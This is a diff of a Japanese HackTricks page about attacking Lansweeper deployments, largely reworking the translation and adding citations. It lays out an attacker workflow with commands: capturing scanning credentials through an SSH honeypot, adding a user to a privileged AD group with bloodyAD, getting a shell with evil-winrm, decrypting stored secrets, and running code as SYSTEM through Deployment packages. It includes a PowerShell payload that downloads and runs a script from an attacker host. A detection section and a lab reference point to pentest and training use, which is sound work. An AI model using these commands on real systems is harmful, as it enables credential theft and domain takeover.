@@ -1,30 +1,30 @@
-# Lansweeper 悪用: Credential Harvesting, Secrets Decryption, and Deployment RCE
+# Lansweeper Abuse: Credential Harvesting、Secrets Decryption、Deployment RCE
 
 {{#include ../../banners/hacktricks-training.md}}
 
-Lansweeper は、Windows 上に配備され、Active Directory と統合されることが多い IT 資産の検出およびインベントリプラットフォームです。Lansweeper に設定された資格情報は、SSH、SMB/WMI、WinRM などのプロトコルを介して資産へ認証するためにスキャンエンジンによって使用されます。設定ミスによりしばしば次が可能になります：
+Lansweeper は、Windows 環境に導入され、Active Directory と統合されることが多い IT asset discovery および inventory platform です。Lansweeper に設定された credentials は、scanning engines が SSH、SMB/WMI、WinRM などの protocol 経由で assets に authenticate するために使用されます。Misconfiguration により、次のことが可能になる場合があります。
 
-- スキャンターゲットを攻撃者管理ホスト（honeypot）にリダイレクトすることでの credential interception
-- Lansweeper 関連グループによって公開された AD ACLs を悪用してリモートアクセスを取得
-- ホスト上での Lansweeper 設定済みの secrets の復号（connection strings と保存された scanning credentials）
-- Deployment 機能を介した管理対象エンドポイントでのコード実行（多くの場合 SYSTEM として実行）
+- scanning target を attacker-controlled host（honeypot）へ redirect することによる credential interception
+- Lansweeper 関連グループによって公開された AD ACLs の abuse による remote access の取得
+- Lansweeper に設定された secrets（connection strings および stored scanning credentials）の on-host decryption
+- Deployment feature による managed endpoints 上での code execution（多くの場合 SYSTEM として実行）
 
-このページは、エンゲージメント中にこれらの挙動を悪用するための実践的な攻撃者ワークフローとコマンドをまとめたものです。
+このページでは、engagement 中にこれらの挙動を abuse するための実践的な attacker workflow と commands をまとめます。
 
-## 1) honeypot を使ったスキャン資格情報の収集 (SSH の例)
+## 1) honeypot による scanning credentials の harvest（SSH example）
 
-Idea: create a Scanning Target that points to your host and map existing Scanning Credentials to it. When the scan runs, Lansweeper will attempt to authenticate with those credentials, and your honeypot will capture them.
+Idea: 自分の host を指す Scanning Target を作成し、既存の Scanning Credentials を割り当てます。scan が実行されると、Lansweeper はそれらの credentials による authenticate を試み、honeypot がそれらを capture します。<sup>[[1]](#references)</sup>
 
-Steps overview (web UI):
+手順の概要（web UI）:
 - Scanning → Scanning Targets → Add Scanning Target
-- Type: IP Range (or Single IP) = your VPN IP
-- Configure SSH port to something reachable (e.g., 2022 if 22 is blocked)
-- Disable schedule and plan to trigger manually
-- Scanning → Scanning Credentials → ensure Linux/SSH creds exist; map them to the new target (enable all as needed)
-- Click “Scan now” on the target
-- Run an SSH honeypot and retrieve the attempted username/password
+- Type: IP Range（または Single IP）= 自分の VPN IP
+- SSH port を到達可能な値に設定（例: 22 が block されている場合は 2022）
+- schedule を disable し、手動で trigger する
+- Scanning → Scanning Credentials → Linux/SSH creds が存在することを確認し、新しい target に map する（必要に応じてすべて enable）
+- target で “Scan now” を click
+- SSH honeypot を run し、試行された username/password を retrieve
 
-Example with sshesame:
+sshesame を使用した example:<sup>[[2]](#references)</sup>
 ```yaml
 # sshesame.conf
 server:
@@ -39,22 +39,22 @@ sshesame --config sshesame.conf
 # authentication for user "svc_inventory_lnx" with password "<password>" accepted
 # connection with client version "SSH-2.0-RebexSSH_5.0.x" established
 ```
-キャプチャした creds を DC サービスに対して検証する:
+取得した creds を DC のサービスに対して検証する：
 ```bash
 # SMB/LDAP/WinRM checks (NetExec)
 netexec smb   inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
 netexec ldap  inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
 netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
 ```
-注意
-- スキャナーを自分のリスナーに強制できる場合、他のプロトコルでも同様に機能する（SMB/WinRM honeypots など）。SSH が最も単純なことが多い。
-- 多くのスキャナーは明確なクライアントバナーで自分自身を識別する（例: RebexSSH）し、uname や whoami などの無害なコマンドを試みる。
+Notes
+- 他のプロトコルでも、scannerを自分のlistenerへcoerceできる場合は同様に機能します（SMB/WinRM honeypotなど）。SSHが最も簡単なことが多いです。
+- 多くのscannerは、固有のclient banner（例：RebexSSH）で自身を識別し、benignなコマンド（uname、whoamiなど）を実行しようとします。
 
-## 2) AD ACL abuse: アプリ管理者グループに自分を追加してリモートアクセスを獲得
+## 2) AD ACL abuse：自分をapp-admin groupに追加してremote accessを取得する
 
-侵害したアカウントから有効な権限を列挙するには BloodHound を使用する。一般的な発見例として、スキャナーやアプリ固有のグループ（例: “Lansweeper Discovery”）が特権グループ（例: “Lansweeper Admins”）に対して GenericAll を持っていることがある。もしその特権グループが “Remote Management Users” のメンバーでもあれば、我々が自分を追加すると WinRM が利用可能になる。
+BloodHoundを使用して、compromised accountから有効な権限を列挙します。よくある検出結果として、scannerまたはapp固有のgroup（例：「Lansweeper Discovery」）が、privileged group（例：「Lansweeper Admins」）に対してGenericAllを保持しているケースがあります。privileged groupが「Remote Management Users」のmemberでもある場合、自分自身を追加するとWinRMが利用可能になります。<sup>[[1]](#references)[[5]](#references)</sup>
 
-収集例:
+Collection examples:
 ```bash
 # NetExec collection with LDAP
 netexec ldap inventory.sweep.vl -u svc_inventory_lnx -p '<password>' --bloodhound -c All --dns-server <DC_IP>
@@ -62,7 +62,7 @@ netexec ldap inventory.sweep.vl -u svc_inventory_lnx -p '<password>' --bloodhoun
 # RustHound-CE collection (zip for BH CE import)
 rusthound-ce --domain sweep.vl -u svc_inventory_lnx -p '<password>' -c All --zip
 ```
-BloodyAD (Linux) を使ってグループの GenericAll を悪用する:
+BloodyAD (Linux) を使用して group の GenericAll を Exploitする:<sup>[[4]](#references)</sup>
 ```bash
 # Add our user into the target group
 bloodyAD --host inventory.sweep.vl -d sweep.vl -u svc_inventory_lnx -p '<password>' \
@@ -71,24 +71,24 @@ add groupMember "Lansweeper Admins" svc_inventory_lnx
 # Confirm WinRM access if the group grants it
 netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
 ```
-次に、interactive shellを取得する:
+次に、インタラクティブシェルを取得します：
 ```bash
 evil-winrm -i inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
 ```
-ヒント: Kerberos の操作は時間に敏感です。KRB_AP_ERR_SKEW が発生した場合は、まず DC と時刻を同期してください:
+ヒント: Kerberos の操作は時間に依存します。KRB_AP_ERR_SKEW が発生した場合は、まず DC と時刻を同期してください:
 ```bash
 sudo ntpdate <dc-fqdn-or-ip>   # or rdate -n <dc-ip>
 ```
-## 3) Decrypt — ホスト上の Lansweeper に設定されたシークレット
+## 3) ホスト上でLansweeper-configured secretsを復号する
 
-Lansweeper サーバーでは、ASP.NET サイトが通常、アプリケーションで使用される暗号化された connection string と対称鍵を格納しています。適切なローカルアクセス権があれば、DB connection string を復号し、保存されているスキャン用の認証情報を抽出できます。
+Lansweeper serverでは、ASP.NET siteが通常、暗号化されたconnection stringと、applicationが使用するsymmetric keyを保存しています。適切なlocal accessがあれば、DB connection stringを復号し、保存されたscanning credentialsを抽出できます。<sup>[[1]](#references)</sup>
 
-Typical locations:
+一般的な場所:
 - Web config: `C:\Program Files (x86)\Lansweeper\Website\web.config`
 - `<connectionStrings configProtectionProvider="DataProtectionConfigurationProvider">` … `<EncryptedData>…`
-- アプリケーションキー: `C:\Program Files (x86)\Lansweeper\Key\Encryption.txt`
+- Application key: `C:\Program Files (x86)\Lansweeper\Key\Encryption.txt`
 
-SharpLansweeperDecrypt を使って、保存された認証情報の復号とダンプを自動化します:
+SharpLansweeperDecryptを使用して、保存されたcredsの復号とdumpを自動化します。<sup>[[3]](#references)</sup>
 ```powershell
 # From a WinRM session or interactive shell on the Lansweeper host
 # PowerShell variant
@@ -99,24 +99,24 @@ powershell -ExecutionPolicy Bypass -File C:\ProgramData\LansweeperDecrypt.ps1
 #  - Connect to Lansweeper DB
 #  - Decrypt stored scanning credentials and print them in cleartext
 ```
-予想される出力には、DB接続の詳細や、環境全体で使用されるWindowsやLinuxアカウントなどのプレーンテキストのスキャン用資格情報が含まれます。これらはしばしばドメインホスト上で昇格したローカル権限を持っています:
+想定される出力には、DB接続情報や、環境全体で使用されているWindowsおよびLinuxアカウントなどの平文のスキャン用認証情報が含まれます。これらは、ドメインホスト上で高いローカル権限を持っていることがよくあります:
 ```text
 Inventory Windows  SWEEP\svc_inventory_win  <StrongPassword!>
 Inventory Linux    svc_inventory_lnx        <StrongPassword!>
 ```
-回収した Windows scanning creds を使用して特権アクセスを取得する:
+回収した Windows スキャン用認証情報を特権アクセスに使用する：
 ```bash
 netexec winrm inventory.sweep.vl -u svc_inventory_win -p '<StrongPassword!>'
 # Typically local admin on the Lansweeper-managed host; often Administrators on DCs/servers
 ```
 ## 4) Lansweeper Deployment → SYSTEM RCE
 
-“As a member of “Lansweeper Admins”, the web UI exposes Deployment and Configuration. Under Deployment → Deployment packages, you can create packages that run arbitrary commands on targeted assets. Execution is performed by the Lansweeper service with high privilege, yielding code execution as NT AUTHORITY\SYSTEM on the selected host.
+“Lansweeper Admins”のメンバーである場合、web UIからDeploymentとConfigurationが利用できます。Deployment → Deployment packagesでは、対象のasset上で任意のコマンドを実行するpackageを作成できます。実行は高い権限を持つLansweeper serviceによって行われるため、選択したhost上でNT AUTHORITY\SYSTEMとしてcode executionが可能です。<sup>[[1]](#references)</sup>
 
 High-level steps:
-- Create a new Deployment package that runs a PowerShell or cmd one-liner (reverse shell, add-user, etc.).
-- Target the desired asset (e.g., the DC/host where Lansweeper runs) and click Deploy/Run now.
-- Catch your shell as SYSTEM.
+- PowerShellまたはcmdのone-liner（reverse shell、add-userなど）を実行する新しいDeployment packageを作成します。
+- 目的のasset（例：Lansweeperが実行されているDC/host）を対象にし、Deploy/Run nowをクリックします。
+- SYSTEMとしてshellを取得します。
 
 Example payloads (PowerShell):
 ```powershell
@@ -127,27 +127,27 @@ powershell -nop -w hidden -c "whoami > C:\Windows\Temp\ls_whoami.txt"
 powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://<attacker>/rs.ps1')"
 ```
 OPSEC
-- デプロイ操作はノイズが大きく、LansweeperやWindowsのイベントログに痕跡を残します。必要最小限で使用してください。
+- Deployment actions are noisy and leave logs in Lansweeper and Windows event logs. 慎重に使用する。
 
-## 検出とハードニング
+## Detection and hardening
 
-- 匿名のSMB列挙を制限または無効化します。RID cyclingやLansweeperの共有への異常なアクセスを監視してください。
-- 送信制御：スキャナホストからの outbound SSH/SMB/WinRM をブロックまたは厳格に制限します。非標準ポート（例: 2022）やRebexのような異常なクライアントバナーに対してアラートを出してください。
-- Protect `Website\\web.config` and `Key\\Encryption.txt`。シークレットをvaultに外部化し、露出時にローテーションしてください。最小権限のサービスアカウントや、可能な場合はgMSAの利用を検討してください。
-- AD監視：Lansweeper関連グループ（例: “Lansweeper Admins”, “Remote Management Users”）の変更や、特権グループに対してGenericAll/Writeメンバーシップを付与するACL変更にアラートを設定してください。
-- 展開パッケージの作成/変更/実行を監査し、パッケージが cmd.exe/powershell.exe を起動したり、予期しない outbound 接続を行った場合にアラートを出してください。
+- 匿名 SMB 列挙を制限または削除する。RID cycling と Lansweeper shares への異常なアクセスを監視する。
+- Egress controls: scanner hosts からの outbound SSH/SMB/WinRM をブロックするか、厳格に制限する。非標準ポート（例: 2022）や、Rebex のような通常とは異なる client banners を検知する。
+- `Website\\web.config` と `Key\\Encryption.txt` を保護する。secret は vault に外部化し、露出した場合は rotate する。最小権限の service accounts と、可能な場合は gMSA の使用を検討する。
+- AD monitoring: Lansweeper 関連グループ（例: “Lansweeper Admins”、“Remote Management Users”）への変更、および privileged groups の membership に GenericAll/Write を付与する ACL changes を検知する。
+- Deployment package の creations/changes/executions を audit する。cmd.exe/powershell.exe を spawn する package や、予期しない outbound connections を検知する。
 
 ## Related topics
-- SMB/LSA/SAMR enumeration and RID cycling
-- Kerberos password spraying and clock skew considerations
-- BloodHound path analysis of application-admin groups
-- WinRM usage and lateral movement
+- SMB/LSA/SAMR enumeration と RID cycling
+- Kerberos password spraying と clock skew の考慮事項
+- application-admin groups の BloodHound path analysis
+- WinRM usage と lateral movement
 
 ## References
-- [HTB: Sweep — Abusing Lansweeper Scanning, AD ACLs, and Secrets to Own a DC (0xdf)](https://0xdf.gitlab.io/2025/08/14/htb-sweep.html)
-- [sshesame (SSH honeypot)](https://github.com/jaksi/sshesame)
-- [SharpLansweeperDecrypt](https://github.com/Yeeb1/SharpLansweeperDecrypt)
-- [BloodyAD](https://github.com/CravateRouge/bloodyAD)
-- [BloodHound CE](https://github.com/SpecterOps/BloodHound)
+- [1] [HTB: Sweep — Abusing Lansweeper Scanning, AD ACLs, and Secrets to Own a DC (0xdf)](https://0xdf.gitlab.io/2025/08/14/htb-sweep.html)
+- [2] [sshesame (SSH honeypot)](https://github.com/jaksi/sshesame)
+- [3] [SharpLansweeperDecrypt](https://github.com/Yeeb1/SharpLansweeperDecrypt)
+- [4] [BloodyAD](https://github.com/CravateRouge/bloodyAD)
+- [5] [BloodHound CE](https://github.com/SpecterOps/BloodHound)
 
 {{#include ../../banners/hacktricks-training.md}}
